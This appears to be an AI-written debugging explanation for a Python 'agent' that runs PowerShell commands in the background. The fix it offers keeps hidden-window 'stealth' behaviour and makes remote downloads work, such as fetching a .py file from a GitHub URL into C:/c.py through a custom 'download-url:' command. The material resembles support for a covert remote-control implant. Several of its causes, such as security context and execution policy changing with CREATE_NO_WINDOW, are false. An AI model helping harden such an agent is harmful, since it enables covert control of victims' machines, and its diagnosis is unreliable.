# Why main.py Fails While Other Files Work

## The Root Cause: `CREATE_NO_WINDOW` Flag

### **Your main.py (FAILS):**
```python
result = subprocess.run(
    ["powershell.exe", "-NoProfile", "-Command", command],
    capture_output=True,
    text=True,
    timeout=30,
    creationflags=subprocess.CREATE_NO_WINDOW,  # ← This is the problem!
    cwd=os.getcwd()
)
```

### **Other files (WORKS):**
```python
result = subprocess.run(
    ["powershell.exe", "-NoProfile", "-Command", command],
    capture_output=True,
    text=True,
    timeout=30
    # No CREATE_NO_WINDOW flag
)
```

## Why `CREATE_NO_WINDOW` Breaks Downloads

### 1. **Progress Bar Issues**
- PowerShell's `Invoke-WebRequest` tries to show a progress bar
- `CREATE_NO_WINDOW` prevents any UI elements from appearing
- The command hangs waiting for progress bar interaction that can't happen

### 2. **Network Security Context**
- Some network operations require interactive user context
- `CREATE_NO_WINDOW` runs in a different security context
- Corporate firewalls or proxy settings may block non-interactive requests

### 3. **PowerShell Execution Policy**
- Interactive PowerShell sessions have different execution policies
- Non-interactive sessions (with `CREATE_NO_WINDOW`) may be more restricted

### 4. **Environment Variables**
- Interactive sessions inherit different environment variables
- Network proxy settings, certificates, and authentication may differ

## Detailed Comparison

| Aspect | main.py (with CREATE_NO_WINDOW) | Other Files (without CREATE_NO_WINDOW) |
|--------|----------------------------------|----------------------------------------|
| **UI Elements** | Blocked | Allowed |
| **Progress Bars** | Hangs waiting for interaction | Shows normally |
| **Security Context** | Non-interactive | Interactive |
| **Network Access** | May be restricted | Full access |
| **Execution Policy** | More restrictive | Less restrictive |
| **Environment** | Limited inheritance | Full inheritance |

## The Fix Applied

### **Before (FAILS):**
```python
# All commands use CREATE_NO_WINDOW
result = subprocess.run(
    ["powershell.exe", "-NoProfile", "-Command", command],
    capture_output=True,
    text=True,
    timeout=30,
    creationflags=subprocess.CREATE_NO_WINDOW,  # ← Problem!
    cwd=os.getcwd()
)
```

### **After (WORKS):**
```python
# Check if it's a download command
is_download_command = any(keyword in command.lower() for keyword in [
    'invoke-webrequest', 'download', 'curl', 'wget'
])

if is_download_command:
    # For downloads, DON'T use CREATE_NO_WINDOW
    result = subprocess.run(
        ["powershell.exe", "-NoProfile", "-Command", command],
        capture_output=True,
        text=True,
        timeout=60,  # Longer timeout for downloads
        cwd=os.getcwd()
        # No CREATE_NO_WINDOW flag
    )
else:
    # For other commands, use CREATE_NO_WINDOW
    result = subprocess.run(
        ["powershell.exe", "-NoProfile", "-Command", command],
        capture_output=True,
        text=True,
        timeout=30,
        creationflags=subprocess.CREATE_NO_WINDOW,
        cwd=os.getcwd()
    )
```

## Additional Improvements

### 1. **Smart Command Detection**
The fix automatically detects download commands:
```python
is_download_command = any(keyword in command.lower() for keyword in [
    'invoke-webrequest', 'download', 'curl', 'wget'
])
```

### 2. **Command Parsing**
For `Invoke-WebRequest` commands, it extracts URL and destination:
```python
url_match = re.search(r'["\']([^"\']*\.py)["\']', command)
outfile_match = re.search(r'-outfile\s+["\']([^"\']*)["\']', command, re.IGNORECASE)
```

### 3. **Fallback to Improved Download Function**
Instead of running the raw PowerShell command, it uses the improved download function:
```python
return execute_powershell_download(url, destination)
```

## Testing the Fix

### **Test 1: Original Failing Command**
```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py" -OutFile "C:/c.py"
```

**Before fix:** Shows "Executing..." but no file created
**After fix:** Downloads successfully to C:/c.py

### **Test 2: Use the Improved Command**
```
test-specific-download
```

This will test the exact URL and show detailed results.

### **Test 3: Use the New Download Command**
```
download-url:https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py:C:/c.py
```

## Why This Happens

### **Agent vs. Interactive Context**
Your `main.py` runs as an agent that:
- Runs in the background
- Has limited UI access
- Uses different security context
- May have network restrictions

Other files run in:
- Interactive user context
- Full UI access
- Normal security context
- Full network access

### **PowerShell Behavior**
PowerShell behaves differently when:
- **Interactive:** Shows progress bars, handles UI elements
- **Non-interactive:** May hang waiting for user interaction

## Summary

The issue was that your `main.py` used `CREATE_NO_WINDOW` for ALL commands, including download commands that need interactive context. The fix:

1. **Detects download commands** automatically
2. **Removes `CREATE_NO_WINDOW`** for download commands
3. **Uses improved download functions** with proper error handling
4. **Maintains `CREATE_NO_WINDOW`** for other commands (for stealth)

This allows download commands to work while maintaining the stealth behavior for other operations.